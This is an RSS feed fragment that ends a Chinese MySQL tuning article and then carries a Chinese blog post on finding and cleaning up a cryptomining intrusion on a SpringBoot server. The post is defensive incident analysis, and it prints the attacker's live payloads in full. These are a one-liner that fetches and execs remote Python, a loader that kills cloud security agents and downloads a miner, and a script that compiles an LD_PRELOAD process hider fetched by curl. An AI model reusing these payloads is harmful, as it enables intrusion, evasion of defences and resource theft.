data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;禁止分页查询偏移量过大，如limit 100000,10&lt;/p&gt;&lt;/blockquote&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;strong&gt;使用覆盖索引&lt;/strong&gt;&lt;br/&gt;减少select * 借助覆盖索引，减少回表查询次数。&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;strong&gt;多表关联查询时，小表在前，大表在后&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;在MySQL中，执行from后的表关联查询是从左往右执行的，第一张表会涉及到全表扫描，所以将小表放在前面，先扫小表，扫描快效率较高，在扫描后面的大表，或许只扫描大表的前100行就符合返回条件并return了。&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;MySQL采用从左往右的顺序解析where子句，可以将过滤数据多的条件放在前面，最快速度缩小结果集。&lt;/p&gt;&lt;/blockquote&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;strong&gt;使用小范围事务，而非大范围事务&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;strong&gt;遵循最左匹配原则&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;strong&gt;使用联合索引，而非建立多个单独索引&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;4.3 慢SQL的分析&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在分析慢SQL之前需要通过MySQL进行相关设置：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;开启：SET GLOBAL slow_query_log = 1;&lt;br/&gt;开启状态：SHOW VARIABLES LIKE &lt;span&gt;&#x27;%slow_query_log%&#x27;&lt;/span&gt;;&lt;br/&gt;设置阈值：SET GLOBAL long_query_time=3;&lt;br/&gt;查看阈值：SHOW GLOBAL VARIABLES LIKE &lt;span&gt;&#x27;long_query_time%&#x27;&lt;/span&gt;; &lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;explain分析SQL&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;explain命令只需要加在select之前即可，例如:&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;explain select * from std where id &amp;lt; 100;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;该命令会展示sql语句的详细执行过程，帮助我们定位问题，网上关于explain的用法和讲解很多，本文不再展开。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;5. 小结&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;本文从慢SQL的危害、Innodb存储引擎、聚集索引、非聚集索引、索引失效、SQL优化、慢SQL分析等角度进行了阐述。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;MySQL的很多知识点都非常复杂，并非一两篇文章能讲清楚的，因此本文在很多地方显得很单薄，好在网上资料非常多。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果本文能在某些方面对读者有所启发，足矣。&lt;/p&gt;&lt;hr/&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;已经在写 MySQL 锁的文章了，关注我追更哟~&lt;/p&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzkxNTE3NjQ3MA==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/eSdk75TK4nEf5LN3Y4UErfNUkiaMseJPkdXA4xPD6Uicl8EqAJAEKVIKalU19xS41TO3aPmHK5bqbzGTwu3z92Kg/0?wx_fmt=png&quot; data-nickname=&quot;yes的练级攻略&quot; data-alias=&quot;yes_java&quot; data-signature=&quot;用接地气的话来分享一些后端技术或写一些想写的。&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;/section&gt;
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>860b1e9654091909d02231f8992544b5</guid>
<title>记一次服务器被入侵挖矿</title>
<link>https://toutiao.io/k/pks06jh</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div itemprop=&quot;articleBody&quot; class=&quot;post-content&quot;&gt;&lt;p&gt;常在河边走，哪能不湿鞋。自认为安全防范意识不错，没想到服务器被入侵挖矿的事情也能落到自己头上。&lt;/p&gt;&lt;p&gt;本文简要记录发现服务器被入侵挖矿的过程，同时分析木马的痕迹和信息，最后给出解决方法。&lt;br/&gt; &lt;span id=&quot;bnp_i_1&quot;/&gt;&lt;/p&gt;&lt;h2&gt;服务器被入侵挖矿过程&lt;/h2&gt;&lt;h3&gt;事情经过&lt;/h3&gt;&lt;p&gt;昨天是周六，睡得比较晚。躺床上玩手机时忽然收到&lt;a href=&quot;https://www.aliyun.com/minisite/goods?userCode=k4evdv8n&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;阿里云&lt;/a&gt;短信和邮件提醒，服务器有异常行为：&lt;/p&gt;&lt;figure id=&quot;attachment_9812&quot; aria-describedby=&quot;caption-attachment-9812&quot; class=&quot;wp-caption aligncenter&quot;&gt;&lt;a href=&quot;https://tlanyan.pp.ua/server-being-hacked-log/%e9%98%bf%e9%87%8c%e4%ba%91%e9%82%ae%e4%bb%b6%e6%8a%a5%e8%ad%a6/&quot; rel=&quot;attachment wp-att-9812&quot;&gt;&lt;noscript&gt;&lt;img class=&quot;size-full wp-image-9812&quot; src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警.png&quot; alt=&quot;阿里云邮件报警&quot; srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警.png?v=1626610200 2216w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警-300x221.png?v=1626610200 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警-1024x755.png?v=1626610200 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警-768x566.png?v=1626610200 768w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警-1536x1133.png?v=1626610200 1536w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警-2048x1510.png?v=1626610200 2048w&quot; sizes=&quot;(max-width: 2216px) 100vw, 2216px&quot;/&gt;&lt;/noscript&gt;&lt;img class=&quot;lazyload size-full wp-image-9812&quot; src=&quot;&quot; data-src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警.png&quot; alt=&quot;阿里云邮件报警&quot; data-srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警.png?v=1626610200 2216w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警-300x221.png?v=1626610200 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警-1024x755.png?v=1626610200 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警-768x566.png?v=1626610200 768w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警-1536x1133.png?v=1626610200 1536w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云邮件报警-2048x1510.png?v=1626610200 2048w&quot; data-sizes=&quot;(max-width: 2216px) 100vw, 2216px&quot;/&gt;&lt;/a&gt;&lt;figcaption id=&quot;caption-attachment-9812&quot; class=&quot;wp-caption-text&quot;&gt;阿里云邮件报警&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;一看邮件内容就知道不得了，赶紧打开电脑处理。&lt;/p&gt;&lt;p&gt;首先用 &lt;code&gt;netstat&lt;/code&gt; 命令查看端口，发现一个异常的端口，但不显示程序名。这时心里已经很清楚，服务器上的Java程序被远程执行代码(RCE)，也许还被植入了&lt;code&gt;rootkit&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;首要问题是保障业务正常可用，于是快速拉起另外一个实例，将业务迁移过去。接下来， 首先将被入侵服务器关机，然后一步步研究入侵过程，以及其在服务器上的行为。&lt;/p&gt;&lt;h3&gt;入侵行为分析&lt;/h3&gt;&lt;p&gt;根据邮件内容，一个&lt;a href=&quot;/tag/spring-boot/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SpringBoot&lt;/a&gt;应用被getshell并被执行远程代码。被执行的代码语句base64解码后为：&lt;/p&gt;&lt;pre&gt;python -c &#x27;import urllib;exec urllib.urlopen(&quot;http://m.windowsupdatesupport.org/d/loader.py&quot;).read()&lt;/pre&gt;&lt;p&gt;将其下载，内容如下：&lt;/p&gt;&lt;pre&gt;import sys
import os
from os.path import expanduser
ver=sys.version


shs=&#x27;&#x27;&#x27;ps aux | grep -v grep | grep &#x27;aegis&#x27; | awk &#x27;{print $11}&#x27; | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep &#x27;hids&#x27; | awk &#x27;{print $11}&#x27; | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep &#x27;cloudwalker&#x27; | awk &#x27;{print $11}&#x27; | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep &#x27;titanagent&#x27; | awk &#x27;{print $11}&#x27; | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep &#x27;edr&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;aegis&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;Yun&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;hids&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;edr&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;cloudwalker&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;titanagent&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;sgagent&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;barad_agent&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep &#x27;hostguard&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}

rm -rf /usr/local/aegis
rm -rf /usr/local/qcloud
rm -rf /usr/local/hostguard/bin


ps aux | grep -v grep | grep &#x27;kworkers&#x27; | awk &#x27;{print $2}&#x27; | xargs  -I {}  kill -9 {}

&#x27;&#x27;&#x27;
os.system(shs)
domainroota=&quot;m.windowsupdatesupport.org&quot;
#domainroota=&quot;192.168.67.131&quot;
#$domainroota
#curl  http://$domainroota/d/kworkers -o $gitdir/kworkers


homedir=expanduser(&quot;~&quot;)
gitdir=&quot;&quot;
try:
    os.mkdir(homedir+&quot;/.git&quot;)
except Exception as e:
    print(e)
if os.path.isdir(homedir+&quot;/.git&quot;):
    gitdir=homedir+&quot;/.git&quot;


try:
    os.mkdir(&quot;./.git&quot;)
except Exception as e:
    print(e)
if os.path.isdir(&quot;./.git&quot;):
    gitdir=&quot;./.git&quot;


downloadu=&quot;http://{}/d/kworkers&quot;.format(domainroota)
if ver.startswith(&quot;3&quot;):
    import urllib.request
    with urllib.request.urlopen(downloadu) as f:
        html = f.read()
        open(gitdir + &quot;/kworkers&quot;, &#x27;wb&#x27;).write(html)
else:
    import urllib2
    with open(gitdir + &quot;/kworkers&quot;, &#x27;wb&#x27;) as f:
        f.write(urllib2.urlopen(&quot;http://{}/d/kworkers&quot;.format(domainroota)).read())
        f.close()

print (&quot;Download Complete!&quot;)
os.system(&quot;chmod 777 &quot;+gitdir+&quot;/kworkers&quot;)
if os.path.isfile(&#x27;/.dockerenv&#x27;):
    os.system(gitdir+&quot;/kworkers&quot;)
else:
    os.system(&quot;nohup {}/kworkers &amp;gt;&amp;gt;{}/.log&amp;amp;&quot;.format(gitdir,gitdir))&lt;/pre&gt;&lt;p&gt;远程代码主要做了这些事情：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;ol&gt;&lt;li&gt;卸载服务器上的安全监控工具；事后开机，发现阿里云盾果然被卸载了；&lt;/li&gt;&lt;li&gt;关掉所有kworkers进程；&lt;/li&gt;&lt;li&gt;在当前目录下创建&lt;code&gt;.git&lt;/code&gt;目录，下载并执行kworkers程序。&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;上网搜了一下kworkers，发现是挖矿应用，并非加密勒索等木马，心里稍微安心一点。通过阿里云后台监控，可以看到木马入侵后，短时间内cpu占用率飙升（本人处理及时，木马挖矿时间大概持续5分钟左右）：&lt;/p&gt;&lt;figure id=&quot;attachment_9814&quot; aria-describedby=&quot;caption-attachment-9814&quot; class=&quot;wp-caption aligncenter&quot;&gt;&lt;a href=&quot;https://tlanyan.pp.ua/server-being-hacked-log/%e9%98%bf%e9%87%8c%e4%ba%91%e6%9c%8d%e5%8a%a1%e5%99%a8cpu%e4%bd%bf%e7%94%a8%e7%8e%87/&quot; rel=&quot;attachment wp-att-9814&quot;&gt;&lt;noscript&gt;&lt;img class=&quot;size-full wp-image-9814&quot; src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云服务器cpu使用率.png&quot; alt=&quot;阿里云服务器cpu使用率&quot; srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云服务器cpu使用率.png?v=1626611298 1134w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云服务器cpu使用率-300x155.png?v=1626611298 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云服务器cpu使用率-1024x529.png?v=1626611298 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云服务器cpu使用率-768x397.png?v=1626611298 768w&quot; sizes=&quot;(max-width: 1134px) 100vw, 1134px&quot;/&gt;&lt;/noscript&gt;&lt;img class=&quot;lazyload size-full wp-image-9814&quot; src=&quot;&quot; data-src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云服务器cpu使用率.png&quot; alt=&quot;阿里云服务器cpu使用率&quot; data-srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云服务器cpu使用率.png?v=1626611298 1134w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云服务器cpu使用率-300x155.png?v=1626611298 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云服务器cpu使用率-1024x529.png?v=1626611298 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/阿里云服务器cpu使用率-768x397.png?v=1626611298 768w&quot; data-sizes=&quot;(max-width: 1134px) 100vw, 1134px&quot;/&gt;&lt;/a&gt;&lt;figcaption id=&quot;caption-attachment-9814&quot; class=&quot;wp-caption-text&quot;&gt;阿里云服务器cpu使用率&lt;/figcaption&gt;&lt;/figure&gt;&lt;h3&gt;服务器残留痕迹&lt;/h3&gt;&lt;p&gt;大概知道了木马的行为，接着重启服务器，查看服务器上的痕迹。&lt;/p&gt;&lt;p&gt;1. 查看有无添加定时任务：&lt;/p&gt;&lt;pre&gt;# crontab -l

0 2 * * * /xxx/.git/kworkers&lt;/pre&gt;&lt;p&gt;木马添加了定时启动任务。&lt;/p&gt;&lt;p&gt;2. 进入木马主目录，发现下载了如下文件：&lt;/p&gt;&lt;figure id=&quot;attachment_9816&quot; aria-describedby=&quot;caption-attachment-9816&quot; class=&quot;wp-caption aligncenter&quot;&gt;&lt;a href=&quot;https://tlanyan.pp.ua/server-being-hacked-log/%e6%8c%96%e7%9f%bf%e6%9c%a8%e9%a9%ac%e4%b8%8b%e8%bd%bd%e7%9a%84%e7%a8%8b%e5%ba%8f%e6%96%87%e4%bb%b6/&quot; rel=&quot;attachment wp-att-9816&quot;&gt;&lt;noscript&gt;&lt;img class=&quot;size-full wp-image-9816&quot; src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/挖矿木马下载的程序文件.png&quot; alt=&quot;挖矿木马下载的程序文件&quot; srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/挖矿木马下载的程序文件.png?v=1626611647 1170w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/挖矿木马下载的程序文件-300x186.png?v=1626611647 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/挖矿木马下载的程序文件-1024x635.png?v=1626611647 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/挖矿木马下载的程序文件-768x477.png?v=1626611647 768w&quot; sizes=&quot;(max-width: 1170px) 100vw, 1170px&quot;/&gt;&lt;/noscript&gt;&lt;img class=&quot;lazyload size-full wp-image-9816&quot; src=&quot;&quot; data-src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/挖矿木马下载的程序文件.png&quot; alt=&quot;挖矿木马下载的程序文件&quot; data-srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/挖矿木马下载的程序文件.png?v=1626611647 1170w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/挖矿木马下载的程序文件-300x186.png?v=1626611647 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/挖矿木马下载的程序文件-1024x635.png?v=1626611647 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/挖矿木马下载的程序文件-768x477.png?v=1626611647 768w&quot; data-sizes=&quot;(max-width: 1170px) 100vw, 1170px&quot;/&gt;&lt;/a&gt;&lt;figcaption id=&quot;caption-attachment-9816&quot; class=&quot;wp-caption-text&quot;&gt;挖矿木马下载的程序文件&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;此外，上层目录和家目录还多了 &lt;code&gt;cert_key.pem&lt;/code&gt; 和 &lt;code&gt;cert.pem&lt;/code&gt; 两个文件，分别存放公钥和密钥。&lt;/p&gt;&lt;p&gt;3. 查看木马留下的日志，有如下内容：&lt;/p&gt;&lt;pre&gt;/xxx/.git
/xxx/.git
working dir /xxx from pid 23684
version not exist download
Downloaded: http://m.windowsupdatesupport.org/d/download
version not exist dbus
Downloaded: http://m.windowsupdatesupport.org/d/dbus
version not exist hideproc.sh
Downloaded: http://m.windowsupdatesupport.org/d/hideproc.sh
error exit status 1version not exist sshkey.sh
Downloaded: http://m.windowsupdatesupport.org/d/sshkey.sh
version not exist autoupdate
Downloaded: http://m.windowsupdatesupport.org/d/autoupdate
version not exist kworkers
Key path not found
/xxx/.git
passfound  protected
passfound  provided
passfound  +client
passfound  +client
passfound  protected
passfound  provided
passfound  quality
passfound  (plus
passfound  (digits,
passfound  prompt
found aksk xxxx xxxx
found aksk xxxx xxxx
passfound  xxx
passfound  xxx
passfound  xxx
passfound  xxx
passfound  xxx
passfound  xxx
lstat /proc/7776/fd/3: no such file or directory
lstat /proc/7776/fdinfo/3: no such file or directory
lstat /proc/7776/task/7776/fd/3: no such file or directory
lstat /proc/7776/task/7776/fdinfo/3: no such file or directory
lstat /proc/7776/task/7777/fd/3: no such file or directory
lstat /proc/7776/task/7777/fdinfo/3: no such file or directory
lstat /proc/7776/task/7778/fd/3: no such file or directory
lstat /proc/7776/task/7778/fdinfo/3: no such file or directory
lstat /proc/7776/task/7779/fd/3: no such file or directory
lstat /proc/7776/task/7779/fdinfo/3: no such file or directory
lstat /proc/7776/task/7780/fd/3: no such file or directory
lstat /proc/7776/task/7780/fdinfo/3: no such file or directory
lstat /proc/7776/task/7781/fd/3: no such file or directory
lstat /proc/7776/task/7781/fdinfo/3: no such file or directory
lstat /proc/7776/task/7782/fd/3: no such file or directory
lstat /proc/7776/task/7782/fdinfo/3: no such file or directory
lstat /proc/7776/task/7783/fd/3: no such file or directory
lstat /proc/7776/task/7783/fdinfo/3: no such file or directory
restart cmd  /xxx/.git/kworkers
/xxx/.git
passfound  file,
passfound  settings
passfound  file.
passfound  callbacks
passfound  Callback
passfound  example
passfound  prompt
passfound  password
passfound  information
passfound  token
passfound  token
passfound  token
passfound  Password
passfound  password
passfound  password
passfound  -based
passfound  Password
passfound  (using
passfound  field&amp;gt;
passfound  retry
passfound  foobar
passfound  foobar
passfound  foobar
passfound  foobar
passfound  foobar
passfound  password
passfound  password
passfound  foobar
passfound  foobar
passfound  secretr
total passwords 25
xxx.xxx.xxx.xxx
lan ip
doscan range  xxx.xxx.0.0/16
ping...
Receive 24 bytes from xxx.xxx.xxx.xxx: icmp_seq=0 time=496.309µs
working dir /xxx from pid 7792
Receive 24 bytes from xxx.xxx.xxx: icmp_seq=0 time=257.973µs
xxx.xxx.xxx is alive
xxx.xxx.xxx is alive
xxx.xxx.xxx:80  open
xxx.xxx0xxx:443  open
version  same download
version  same dbus
restart dbus
exec again dbus downrun
kill process pid 23709

process completed
version  same hideproc.sh
skip restart hideproc.sh
version  same sshkey.sh
skip restart sshkey.sh
version  same autoupdate
skip restart autoupdate
version  same kworkers
Key path not found&lt;/pre&gt;&lt;p&gt;根据日志，主要是下载程序，检测用户名和密码，探测内网，然后启动自动更新、隐藏进程等程序。&lt;/p&gt;&lt;p&gt;4. 对&lt;code&gt;hideproc.sh&lt;/code&gt;感兴趣，其内容为：&lt;/p&gt;&lt;pre&gt;if [ &quot;$EUID&quot; -ne 0 ]
  then echo &quot;Please run as root&quot;
else
  if [ `grep libc2.28 /etc/ld.so.preload`  ]
  then echo &quot;hideproc already done!!&quot;
  else
    apt-get update -y
    apt-get install build-essential -y
    yum check-update
    yum install build-essential -y
    dnf groupinstall &quot;Development Tools&quot; -y
    yum group install &quot;Development Tools&quot;  -y
    curl http://m.windowsupdatesupport.org/d/processhider.c -o  processhider.c

    gcc -Wall -fPIC -shared -o libc2.28.so processhider.c -ldl
    mv libc2.28.so /usr/local/lib/ -f
    grep libc2.28 /etc/ld.so.preload  || echo /usr/local/lib/libc2.28.so &amp;gt;&amp;gt; /etc/ld.so.preload
    rm -f processhider.c
    ls &amp;gt;/tmp/.1  2&amp;gt;&amp;amp;1
    grep libc2.28.so /tmp/.1 &amp;amp;&amp;amp; echo &amp;gt;/etc/ld.so.preload
  fi
fi&lt;/pre&gt;&lt;p&gt;其首先检测是否root用户，然后编译libc2共享库，注入隐藏进程的代码。这应该是用&lt;code&gt;netstat&lt;/code&gt;无法查看到进程名的原因。&lt;/p&gt;&lt;p&gt;5. 查看访问日志，发现期间有个IP对服务器进行爆破：&lt;/p&gt;&lt;figure id=&quot;attachment_9818&quot; aria-describedby=&quot;caption-attachment-9818&quot; class=&quot;wp-caption aligncenter&quot;&gt;&lt;a href=&quot;https://tlanyan.pp.ua/server-being-hacked-log/nginx%e7%88%86%e7%a0%b4%e6%97%a5%e5%bf%97/&quot; rel=&quot;attachment wp-att-9818&quot;&gt;&lt;noscript&gt;&lt;img class=&quot;size-full wp-image-9818&quot; src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志.png&quot; alt=&quot;Nginx爆破日志&quot; srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志.png?v=1626613017 3782w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志-300x151.png?v=1626613017 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志-1024x517.png?v=1626613017 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志-768x387.png?v=1626613017 768w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志-1536x775.png?v=1626613017 1536w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志-2048x1033.png?v=1626613017 2048w&quot; sizes=&quot;(max-width: 3782px) 100vw, 3782px&quot;/&gt;&lt;/noscript&gt;&lt;img class=&quot;lazyload size-full wp-image-9818&quot; src=&quot;&quot; data-src=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志.png&quot; alt=&quot;Nginx爆破日志&quot; data-srcset=&quot;https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志.png?v=1626613017 3782w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志-300x151.png?v=1626613017 300w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志-1024x517.png?v=1626613017 1024w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志-768x387.png?v=1626613017 768w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志-1536x775.png?v=1626613017 1536w, https://tlanyan.pp.ua/wp-content/uploads/2021/07/Nginx爆破日志-2048x1033.png?v=1626613017 2048w&quot; data-sizes=&quot;(max-width: 3782px) 100vw, 3782px&quot;/&gt;&lt;/a&gt;&lt;figcaption id=&quot;caption-attachment-9818&quot; class=&quot;wp-caption-text&quot;&gt;Nginx爆破日志&lt;/figcaption&gt;&lt;/figure&gt;&lt;h3&gt;其他信息&lt;/h3&gt;&lt;p&gt;除了上述文件，&lt;code&gt;/tmp&lt;/code&gt;文件夹下还生成了.1和.1.sh文件；&lt;/p&gt;&lt;p&gt;查询可疑ip，位于国内北京市，应该是肉鸡；&lt;/p&gt;&lt;p&gt;查询木马下载域名windowsupdatesupport.org，今年6月注册，解析ip都在国外。该域名很有混淆性，并且为了方便直接用http访问；&lt;/p&gt;&lt;p&gt;除了下载木马文件挖矿，未改变服务器上的其他数据。&lt;br/&gt; &lt;span id=&quot;bnp_i_2&quot;/&gt;&lt;/p&gt;&lt;h2&gt;服务器被入侵挖矿解决办法&lt;/h2&gt;&lt;p&gt;虽然知道是SpringBoot应用触发了RCE，但遗憾目前仍未找到是哪个包导致的漏洞。目前采取的缓解措施为：&lt;/p&gt;&lt;p&gt;1. 被入侵服务器重装系统；&lt;/p&gt;&lt;p&gt;2. 使用非root用户启动SpringBoot应用；&lt;/p&gt;&lt;p&gt;3. 被入侵的是子系统，增加基本授权：&lt;/p&gt;&lt;pre&gt;apt install -y apache2-utils
htpasswd /etc/nginx/conf.d/.htpasswd user&lt;/pre&gt;&lt;p&gt;然后配置Nginx使用认证信息：&lt;/p&gt;&lt;pre&gt;server {
  ...
  auth_basic  &quot;子系统鉴权：&quot;;
  auth_basic_user_file /etc/nginx/conf.d/.htpasswd;
  ..
}&lt;/pre&gt;&lt;p&gt;4. 防火墙限制对外连接。&lt;/p&gt;&lt;p&gt;上述错误能一定程度上避免类似情况再次发生，但找到应用程序中的漏洞才是接下来的重点。&lt;br/&gt; &lt;span id=&quot;bnp_i_3&quot;/&gt;&lt;/p&gt;&lt;h2&gt;总结&lt;/h2&gt;&lt;p&gt;幸运的是这次来的是挖矿木马，服务器上的程序和数据都未受影响。也很感谢&lt;a href=&quot;https://www.aliyun.com/minisite/goods?userCode=k4evdv8n&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;阿里云&lt;/a&gt;免费的安全提醒，让我在第一时间处理。&lt;/p&gt;&lt;p&gt;但这次事故也敲醒了警钟：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;不要随意用root权限运行程序；&lt;/li&gt;&lt;li&gt;防火墙权限要严格收紧；&lt;/li&gt;&lt;li&gt;做好安全监控；&lt;/li&gt;&lt;li&gt;时刻做好数据备份。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;span id=&quot;bnp_i_4&quot;/&gt;&lt;/p&gt;&lt;h2&gt;参考&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://docs.nginx.com/nginx/admin-guide/security-controls/configuring-http-basic-authentication/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Restricting Access with HTTP Basic Authentication&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/u013467442/article/details/88937381&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;记录一次解决kworkerds挖矿木马的过程&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tlanyan.pp.ua/site-recent-security-events/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;本站近期发生的几起安全事故&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tlanyan.pp.ua/server-protect-cc-attack/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;服务器简易防CC攻击设置&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tlanyan.pp.ua/do-hide-site-real-ip/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;做一个永不暴露真实IP的网站&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt; 